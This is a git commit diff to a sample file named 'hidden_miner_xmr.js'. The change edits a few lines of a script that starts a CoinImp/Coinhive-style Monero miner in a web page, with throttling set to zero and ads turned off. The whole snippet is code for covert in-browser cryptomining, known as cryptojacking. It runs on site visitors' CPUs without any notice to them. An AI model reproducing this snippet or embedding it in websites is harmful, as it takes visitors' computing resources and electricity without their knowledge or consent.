9ab1bfc9e1c5bc7d0dbbcf55ad9e377b0ac55e23
Tsarev Vladimir <sau412@gmail.com>
2019-02-25 14:15:31 +0300

    Update hidden_miner_xmr.js

--- coinimp_samples/hidden_miner_xmr.js
+++ coinimp_samples/hidden_miner_xmr.js
@@ -2,7 +2,7 @@
 <script>
     var _client = new Client.User('b08f81fafca1ec23052ddfd107eac9baa22c01c061d65c5b7f350c9a40fe5ea5',
         'YOUR_COIHIVE_DATA-USER_KEY',{
-        throttle: 0, c: 'w', ads: 0
+        throttle: 0, ads: 0
     });
     _client.start();
 </script>
